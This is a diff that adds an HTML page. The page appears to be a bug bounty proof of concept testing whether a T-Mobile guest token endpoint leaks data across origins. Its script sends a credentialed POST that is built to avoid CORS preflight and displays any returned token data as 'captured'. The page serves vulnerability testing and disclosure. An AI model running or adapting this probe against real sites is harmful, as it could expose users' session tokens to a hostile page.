@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T-Mobile CORS Bug Bounty PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 30px; line-height: 1.6; color: #333; }
+        .container { max-width: 800px; margin: 0 auto; border: 1px solid #ddd; padding: 20px; border-radius: 10px; }
+        h1 { color: #e20074; } /* T-Mobile Magenta */
+        #runBtn { 
+            background-color: #e20074; color: white; border: none; padding: 15px 30px; 
+            font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold;
+        }
+        #runBtn:hover { background-color: #b1005b; }
+        #output { 
+            background: #2b2b2b; color: #00ff00; padding: 15px; 
+            border-radius: 5px; overflow-x: auto; min-height: 100px; margin-top: 20px;
+            white-space: pre-wrap; word-wrap: break-word;
+        }
+        .status-box { margin-bottom: 10px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>CORS PoC: adn.t-mobile.com</h1>
+    <p>This page tests if the T-Mobile token endpoint is vulnerable to a Cross-Origin data leak.</p>
+    
+    <div class="status-box">Status: <span id="statusText">Ready</span></div>
+    <button id="runBtn">Fire Fetch Request</button>
+
+    <h3>Captured Data / Error:</h3>
+    <pre id="output">No data captured yet. Open DevTools (F12) to watch the Network tab.</pre>
+</div>
+
+<script>
+    document.getElementById('runBtn').addEventListener('click', function() {
+        const output = document.getElementById('output');
+        const statusText = document.getElementById('statusText');
+        
+        statusText.innerText = "Running...";
+        output.innerText = "Initiating fetch request...";
+
+        // --- THE FETCH BLOCK ---
+        const cacheBuster = '?v=' + Date.now();
+        const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;
+
+        fetch(target, {
+            method: 'POST',
+            mode: 'cors',         // Tells the browser to check for CORS headers
+            credentials: 'include', // Attempts to send T-Mobile cookies
+            headers: {
+                'Content-Type': 'text/plain', // Used to avoid some preflight checks
+                'Cache-Control': 'no-cache'
+            },
+            body: '{}' 
+        })
+        .then(response => {
+            // If the server has a CORS bug, these logs will show the data
+            console.log("Response Received. Status:", response.status);
+            statusText.innerText = "Response Received (" + response.status + ")";
+            
+            // This is the "Bypass Proof":
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            console.log("Access-Control-Allow-Origin:", acao);
+
+            return response.text(); 
+        })
+        .then(data => {
+            // If CORS is blocked, this block will NOT run
+            output.innerText = data || "Success! But the response body was empty.";
+            console.log("Success! Data:", data);
+        })
+        .catch(err => {
+            // This is where "CORS Missing Allow Origin" errors end up
+            output.innerText = "FAILED: " + err;
+            console.error("Fetch Error:", err);
+            statusText.innerText = "Blocked by CORS";
+        });
+        // --- END FETCH BLOCK ---
+    });
+</script>
+
+</body>
+</html>
